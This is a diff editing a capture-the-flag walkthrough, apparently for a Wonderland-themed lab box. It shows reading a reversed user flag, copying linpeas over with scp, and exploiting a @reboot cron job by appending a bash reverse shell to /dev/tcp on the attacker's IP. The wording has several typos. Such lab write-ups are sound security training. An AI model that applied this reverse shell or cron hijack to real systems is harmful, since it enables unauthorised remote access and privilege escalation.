@@ -16,12 +16,11 @@ and we login to find the user.txt, which has user flag in reverse  order so we c
 ```cat user.txt | rev ```.
 now we can look around using linpeas.(lets copy it to the system)
 ```scp /location/linpeas.sh jabberwock@IP:. ```
-and we see that upon reboot: - 
+Using linoeas we find the vulnerability.
 ```
 @reboot tweedledum bash /home/jabberwock/twasBrillig.sh
 ```
-tweedledum will run this script so we can add a line
-
+and we see that upon reboot tweedledum will run this the script in present on out directory so we can add a line
 ```
 /bin/bash -c '/bin/bash -i >& /dev/tcp/<our ip>/<port> 2>&1 0>&1'
 ```
